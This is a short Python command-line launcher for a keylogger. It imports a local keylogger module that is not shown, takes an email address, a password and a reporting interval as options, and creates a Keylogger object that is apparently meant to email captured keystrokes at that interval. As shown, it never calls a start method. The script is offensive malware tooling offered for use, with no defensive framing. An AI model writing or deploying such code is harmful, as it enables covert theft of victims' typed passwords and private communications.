#!/usr/bin/env python
import keylogger
import optparse


def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-e", "--email", dest="email", help="The email address you want the reports to be sent to.")
    parser.add_option("-p", "--password", dest="password", help="The password for your email address.")
    parser.add_option("-i", "--interval", dest="interval", help="The time interval you want to use. Eg. 120 will send a log update every 2 minutes")
    (options, arguments) = parser.parse_args()
    if not options.email:
        parser.error("[-] Please specify an email address to send reports to, use --help for more info")
    if not options.password:
        parser.error("[-] Please specify your email password, use --help for more info")
    if not options.interval:
        parser.error("[-] Please specify the time interval you want to use for reports, use --help for more info")
    return options


options = get_arguments()
email = options.email
password = options.password
interval = options.interval


my_keylogger = keylogger.Keylogger(int(interval), email, password)

